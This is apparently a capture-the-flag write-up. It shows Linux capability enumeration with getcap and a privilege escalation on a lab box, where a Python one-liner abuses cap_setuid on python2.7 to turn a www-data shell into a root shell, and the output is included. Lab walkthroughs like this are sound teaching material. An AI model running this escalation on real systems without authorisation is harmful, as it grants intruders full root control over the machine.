# Linux Capabilities

I had another box to hack, but the initial access portion was a mix of default creds and unrestricted file uploads. I have like 3 posts going over just that, so I’m skipping that part.

What I’d like to focus on is Linux capabilities. From the man page:

> For the purpose of performing permission checks, traditional UNIX implementations distinguish two categories of processes: privileged processes (whose effective user ID is 0, referred to as superuser or root), and unprivileged processes (whose effective UID is nonzero). Privileged processes bypass all kernel permission checks, while unprivileged processes are subject to full permission checking based on the process's credentials (usually: effective UID, effective GID, and supplementary group list).
>
> Starting with kernel 2.2, Linux divides the privileges traditionally associated with superuser into distinct units, known as capabilities, which can be independently enabled and disabled. Capabilities are a per-thread attribute. 

Cool, and capabilities can be applied to executables.

You can look at these capabilities with ‘getcap’

```
www-data@katana:/$ getcap -r / 2>/dev/null
getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_raw+ep
/usr/bin/python2.7 = cap_setuid+ep
```

Cool, so python2.7 can setuid. Let’s exploit it.

```
www-data@katana:/$ python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
<c 'import os; os.setuid(0); os.system("/bin/bash")'
root@katana:/# id
id
uid=0(root) gid=33(www-data) groups=33(www-data)
```

and boom, root!
